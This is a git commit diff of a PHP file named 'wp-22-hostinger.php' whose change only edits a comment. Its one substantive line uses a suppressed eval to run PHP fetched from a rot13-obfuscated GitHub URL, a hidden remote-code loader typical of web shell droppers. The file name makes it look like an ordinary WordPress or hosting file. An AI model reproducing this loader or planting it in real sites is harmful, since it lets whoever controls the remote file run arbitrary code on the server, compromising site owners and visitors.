7d0aeaf1d20a9f42fdeeb63ea45d23d93ce957f4
Rahman Saputra <69113156+NoobTecho@users.noreply.github.com>
2024-12-31 08:07:46 +0700

    Update wp-22-hostinger.php

--- Lyy-Code/wp-22-hostinger.php
+++ Lyy-Code/wp-22-hostinger.php
@@ -1,6 +1,6 @@
 
 <?php
-// lyymeme
+//qeqeqe lyymeme
 
 
 @eval("?>" . @file_get_contents(str_rot13("uggcf://enj.tvguhohfrepbagrag.pbz/AbboGrpub/NyngGrzche/ersf/urnqf/znva/Yll-Pbqr/Bevtvany-jc-22.cuc")));
